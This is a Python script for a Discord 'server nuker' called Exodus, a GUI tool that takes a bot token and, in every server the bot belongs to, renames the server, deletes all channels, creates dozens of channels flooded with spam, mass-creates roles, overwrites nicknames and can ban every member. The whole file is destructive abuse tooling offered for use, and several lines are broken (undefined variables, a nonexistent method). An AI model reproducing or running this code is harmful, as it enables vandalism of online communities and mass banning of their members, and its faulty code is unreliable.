# imports -----
import os
import threading
import asyncio
import customtkinter as ctk
from tkinter import messagebox
import discord
from discord.ext import commands

# creds to l33tlord on github for coding this simple nuker
## https://github.com/l33tlord

# configs -----
ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title("Exodus")
app.geometry("400x545")
app.resizable(False, False)
script_dir = os.path.dirname(os.path.abspath(__file__))
icon_path = os.path.join(script_dir, "log.ico")
app.iconbitmap(icon_path)
app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

loop = None

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# start func -----
def startbot(token, spammessage, channelsname, servername, ban_members, rolename, nickname, giverole):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
    bot.remove_command('help')

    @bot.event
    async def on_ready():
        clear()
        print(f"Bot: {bot.user} ({len(bot.guilds)} guilds)")
        print(f"Spam message: {spammessage}")
        print(f"Channels name: {channelsname}")
        print(f"New server name: {servername}")
        print(f"Ban members: {ban_members}")
        print(f"Role name: {rolename}")
        print(f"Nickname: {nickname}")
        print(f"Give roles to all: {giverole}")
        print("Bot is ready. Nuking will start itself.")
        for guild in bot.guilds:
            await nuke_guild(guild)

    async def nuke_guild(guild):
        print(f"Nuking {guild.name} ({guild.id})...")
        await guild.edit(name=servername)
        tasks = [
            delnew(guild, channelsname, spammessage),
            spamrole(guild, rolename, giverole),
            changenick(guild, nickname)
        ]
        if ban_members == "on":
            tasks.append(banallmem(guild))
        await asyncio.gather(*tasks)

# if you would like to disable some functions, you can comment them out. -----

# ban all memb func -----
    async def banallmem(guild):
        for member in guild.members:
            if member != bot.user:
                try:
                    await member.ban(reason="GG")
                    print(f"Banned {namemem}#{memdis}")
                except Exception as e:
                    print(f"Failed to ban {namemem}#{memdis}: {e}")
 
# deletes and creates new channels -----
    async def delnew(guild, channelsname, spammessage):
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Deleted: #{channel.name}")
            except Exception as e:
                print(f"Failed to delete: #{channel.name}: {e}")

        new_channels = []
        for _ in range(50):
            try:
                channel = await guild.create_text_channel(channelsname)
                new_channels.append(channel)
                print(f"Created: #{channelsname}")

                asyncio.create_task(spam(channel, spammessage))
            except Exception as er:
                print(f"Error creating channel: {er}")
# spams channels -----
    async def spam(channel, spammessage):
        while True:
            try:
                await channel.send(spammessage)
                print(f"Spammed in: #{channel.name}")
            except Exception as e:
                print(f"Failed to spam in: #{channel.name}: {e}")
            await asyncio.sleep(1)
# spams roles -----
    async def spamrole(guild, rolename, giverole):
        max_roles = 250 
        rocount = len(guild.roles)

        while rocount < max_roles:
            try:
                role = await guild.create_role(name=f"{rolename} {rocount + 1}")
                print(f"Created role: {role.name}")
                if giverole == "on":
                    await giveall(guild, role)
                rocount += 1
            except Exception as e:
                print(f"Failed to create role: {e}")
                break
# gives spammed roles to everyone for max destruction -----
    async def giveall(guild, role):
        for member in guild.members:
            try:
                await member.roadd(role)
                print(f"Gave role {role.name} to {namemem}#{memdis}")
            except Exception as e:
                print(f"Failed to give role to {namemem}#{memdis}: {e}")
# change nicknames -----
    async def changenick(guild, nickname):
        for member in guild.members:
            if member != bot.user:
                try:
                    await member.edit(nick=nickname)
                    print(f"Changed nickname for {namemem}#{memdis} to {nickname}")
                except Exception as e:
                    print(f"Failed to change nickname for {namemem}#{memdis}: {e}")

    try:
        bot.run(token)
    except Exception as er:
        print(f"Error: {er}")

def startbutton():
    token = token_entry.get()
    spammessage = spammessage_entry.get()
    channelsname = channelsname_entry.get()
    servername = servername_entry.get()
    ban_members = banmembs.get()
    giverolz = givebutton.get()
    rolename = rolename_entry.get()  
    nickname = nickname_entry.get()  
    if not token or not spammessage or not channelsname or not servername or not rolename or not nickname:
        messagebox.showerror("Error", "You must fill in the missing boxes")
        return
    global loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    bot_thread = threading.Thread(target=lambda: loop.run_until_complete(startbot(
        token, spammessage, channelsname, servername, ban_members, rolename, nickname, giverolz)))
    bot_thread.start()
def on_close():
    os._exit(0)

label = ctk.CTkLabel(master=app, text="Exodus Server Nuker", text_color="white", font=("Helvetica", 26))
label.place(relx=0.5, rely=0.08, anchor=ctk.CENTER)

label = ctk.CTkLabel(master=app, text="User-friendly, customizable and easy to use.", text_color="grey", font=("Helvetica", 14, "italic"))

label.place(relx=0.5, rely=0.13, anchor=ctk.CENTER)
entry_width = 230
entry_height = 30
vertical_spacing = 0.07

token_entry = ctk.CTkEntry(master=app, width=entry_width, height=entry_height, placeholder_text="Bot token...")
token_entry.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)
spammessage_entry = ctk.CTkEntry(master=app, width=entry_width, height=entry_height, placeholder_text="Message to spam...")
spammessage_entry.place(relx=0.5, rely=0.2 + vertical_spacing, anchor=ctk.CENTER)
channelsname_entry = ctk.CTkEntry(master=app, width=entry_width, height=entry_height, placeholder_text="Channel name to spam...")
channelsname_entry.place(relx=0.5, rely=0.2 + 2*vertical_spacing, anchor=ctk.CENTER)
servername_entry = ctk.CTkEntry(master=app, width=entry_width, height=entry_height, placeholder_text="New server name...")
servername_entry.place(relx=0.5, rely=0.2 + 3*vertical_spacing, anchor=ctk.CENTER)
rolename_entry = ctk.CTkEntry(master=app, width=entry_width, height=entry_height, placeholder_text="Name of new roles...")
rolename_entry.place(relx=0.5, rely=0.2 + 4*vertical_spacing, anchor=ctk.CENTER)
nickname_entry = ctk.CTkEntry(master=app, width=entry_width, height=entry_height, placeholder_text="New nicknames...")
nickname_entry.place(relx=0.5, rely=0.2 + 5*vertical_spacing, anchor=ctk.CENTER)
banmembs = ctk.CTkSwitch(master=app, text="Ban all members", text_color="white", onvalue="on", offvalue="off")
banmembs.place(relx=0.5, rely=0.22 + 6*vertical_spacing, anchor=ctk.CENTER)
givebutton = ctk.CTkSwitch(master=app, text="Flood all members with new roles", text_color="white", onvalue="on", offvalue="off")
givebutton.place(relx=0.5, rely=0.29 + 6*vertical_spacing, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Nuke", text_color="white", fg_color="#5e2e8e", hover_color="#7a43b1", command=startbutton)
button.place(relx=0.5, rely=0.25 + 8*vertical_spacing, anchor=ctk.CENTER)
app.protocol("WM_DELETE_WINDOW", on_close)
app.mainloop()
